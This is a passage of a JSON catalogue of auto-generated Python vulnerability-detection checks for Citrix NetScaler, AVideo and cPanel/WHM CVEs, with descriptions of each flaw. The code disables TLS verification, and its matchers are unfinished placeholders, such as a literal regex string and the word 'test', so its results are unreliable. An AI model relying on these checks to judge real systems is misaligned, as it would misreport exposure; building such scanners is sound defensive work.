template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Citrix NetScaler SAML IDP - Memory Overread\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_3055(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-3055\nName: Citrix NetScaler SAML IDP - Memory Overread\nSeverity: critical\nDescription: NetScaler ADC and NetScaler Gateway contain an insufficient input validation vulnerability when configured as a SAML IDP, leading to memory overread, letting attackers potentially access sensitive memory, exploit requires configuration as SAML IDP\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_3055:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-3055\"\n    SEVERITY = \"critical\"\n    NAME = \"Citrix NetScaler SAML IDP - Memory Overread\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: regex('(?i)NSC_TASS=[A-Za-z0-9+/]+=*', set_cookie); status_code == 302\"\n\n        # Simple word matcher simulation\n        matchers = ['(?i)NSC_TASS=[A-Za-z0-9+/]+=*']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Citrix NetScaler SAML IDP - Memory Overread\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_3055(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2026",
          "netscaler",
          "citrix",
          "exposure",
          "kev",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2026_33478",
        "name": "AVideo <= 26.0 - WWBN AVideo - Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "WWBN AVideo <= 26.0 contains multiple vulnerabilities in the CloneSite plugin including unauthenticated exposure of clone secret keys and OS command injection in rsync command construction, letting unauthenticated attackers achieve remote code execution.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{\"data\": [, \"key\":\"' | mot(s) 'application/json' | mot(s) '\"error\", Admin required' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-33478\nName: AVideo <= 26.0 - WWBN AVideo - Remote Code Execution\nSeverity: critical\nDescription: WWBN AVideo <= 26.0 contains multiple vulnerabilities in the CloneSite plugin including unauthenticated exposure of clone secret keys and OS command injection in rsync command construction, letting unauthenticated attackers achieve remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_33478:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-33478\"\n    SEVERITY = \"critical\"\n    NAME = \"AVideo <= 26.0 - WWBN AVideo - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'{\"data\": [, \"key\":\"\\' | mot(s) \\'application/json\\' | mot(s) \\'\"error\", Admin required\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['{\"data\": [, \"key\":\"', 'application/json', '\"error\", Admin required']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AVideo <= 26.0 - WWBN AVideo - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_33478(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-33478\nName: AVideo <= 26.0 - WWBN AVideo - Remote Code Execution\nSeverity: critical\nDescription: WWBN AVideo <= 26.0 contains multiple vulnerabilities in the CloneSite plugin including unauthenticated exposure of clone secret keys and OS command injection in rsync command construction, letting unauthenticated attackers achieve remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_33478:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-33478\"\n    SEVERITY = \"critical\"\n    NAME = \"AVideo <= 26.0 - WWBN AVideo - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'{\"data\": [, \"key\":\"\\' | mot(s) \\'application/json\\' | mot(s) \\'\"error\", Admin required\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['{\"data\": [, \"key\":\"', 'application/json', '\"error\", Admin required']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AVideo <= 26.0 - WWBN AVideo - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_33478(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2026",
          "avideo",
          "clonesite",
          "unauth",
          "oss",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2026_41940",
        "name": "cPanel & WHM - Authentication Bypass via Session-File CRLF Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "cPanel and WHM versions prior to 11.110.0.97, 11.118.0.63, 11.126.0.54, 11.132.0.29, 11.134.0.20, and 11.136.0.5 contain an authentication bypass vulnerability in the login flow that allows unauthenticated remote attackers to gain unauthorized access to the control panel.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 401; contains(header, \"whostmgrrelogin\") / [OR] DSL: status_code == 307; contains(location, \"cpsess\") / [OR] DSL: status_code == 401",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-41940\nName: cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\nSeverity: critical\nDescription: cPanel and WHM versions prior to 11.110.0.97, 11.118.0.63, 11.126.0.54, 11.132.0.29, 11.134.0.20, and 11.136.0.5 contain an authentication bypass vulnerability in the login flow that allows unauthenticated remote attackers to gain unauthorized access to the control panel.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_41940:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-41940\"\n    SEVERITY = \"critical\"\n    NAME = \"cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 401; contains(header, \"whostmgrrelogin\") / [OR] DSL: status_code == 307; contains(location, \"cpsess\") / [OR] DSL: status_code == 401'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_41940(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-41940\nName: cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\nSeverity: critical\nDescription: cPanel and WHM versions prior to 11.110.0.97, 11.118.0.63, 11.126.0.54, 11.132.0.29, 11.134.0.20, and 11.136.0.5 contain an authentication bypass vulnerability in the login flow that allows unauthenticated remote attackers to gain unauthorized access to the control panel.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_41940:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-41940\"\n    SEVERITY = \"critical\"\n    NAME = \"cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 401; contains(header, \"whostmgrrelogin\") / [OR] DSL: status_code == 307; contains(location, \"cpsess\") / [OR] DSL: status_code == 401'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: 